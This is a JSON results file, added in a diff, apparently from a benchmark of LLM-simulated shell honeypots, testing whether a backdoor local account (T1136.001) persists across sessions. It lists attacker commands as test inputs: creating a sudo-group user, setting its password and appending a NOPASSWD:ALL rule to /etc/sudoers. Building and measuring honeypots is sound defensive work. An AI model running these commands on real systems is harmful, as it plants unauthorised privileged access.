@@ -1,0 +1,90 @@
+{
+  "meta": {
+    "timestamp": "20260413_201903",
+    "model": "deepseek-chat",
+    "noise_level": 0,
+    "rows": [
+      2
+    ],
+    "systems": [
+      "shelLM"
+    ],
+    "n_reps": 1,
+    "beelzebub_reset_between_sessions": false,
+    "notes": {
+      "shelLM": "Uses real shelLM personality prompt and history.txt continuation semantics.",
+      "Beelzebub": "Uses real Beelzebub buildPrompt/history-store semantics with DeepSeek backend.",
+      "PromptShield": "Uses existing MCP-backed implementation from appendix_benchmark.py."
+    }
+  },
+  "results": {
+    "shelLM": [
+      {
+        "row": 2,
+        "label": "T1136.001 Local Acct",
+        "avg_kr": 1.0,
+        "avg_sfs": 1.0,
+        "avg_strict_kr": 0.0,
+        "avg_strict_sfs": 0.0,
+        "reps": [
+          {
+            "rep": 1,
+            "kr": 1.0,
+            "sfs": 1.0,
+            "implant_viable": false,
+            "strict_kr": 0.0,
+            "strict_sfs": 0.0,
+            "tokens": 22360,
+            "latency_ms": 20040.4,
+            "session_a_responses": [
+              {
+                "cmd": "useradd -m -s /bin/bash -G sudo sysadm1n",
+                "response": "useradd: Permission denied.\nalex@quantumlab:~$",
+                "tokens": 2256,
+                "latency_ms": 1849.250078201294
+              },
+              {
+                "cmd": "echo 'sysadm1n:Str0ngP@ss!' | chpasswd",
+                "response": "chpasswd: (user sysadm1n) pam_chauthtok() failed, error:\nAuthentication token manipulation error\nchpasswd: error detected, changes ignored\nalex@quantumlab:~$",
+                "tokens": 2340,
+                "latency_ms": 2834.470748901367
+              },
+              {
+                "cmd": "echo \"sysadm1n ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers",
+                "response": "bash: /etc/sudoers: Permission denied\nalex@quantumlab:~$",
+                "tokens": 2404,
+                "latency_ms": 2391.683578491211
+              },
+              {
+                "cmd": "id sysadm1n",
+                "response": "id: ‘sysadm1n’: no such user\nalex@quantumlab:~$",
+                "tokens": 2451,
+                "latency_ms": 1861.0150814056396
+              }
+            ],
+            "session_b_responses": [
+              {
+                "cmd": "id sysadm1n",
+                "response": "id: ‘sysadm1n’: no such user\nalex@quantumlab:~$",
+                "tokens": 2655,
+                "latency_ms": 1899.5776176452637
+              },
+              {
+                "cmd": "grep sysadm1n /etc/passwd",
+                "response": "alex@quantumlab:~$",
+                "tokens": 2695,
+                "latency_ms": 1622.5252151489258
+              },
+              {
+                "cmd": "grep sysadm1n /etc/sudoers",
+                "response": "grep: /etc/sudoers: Permission denied\nalex@quantumlab:~$",
+                "tokens": 2747,
+                "latency_ms": 2620.3975677490234
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  }
+}
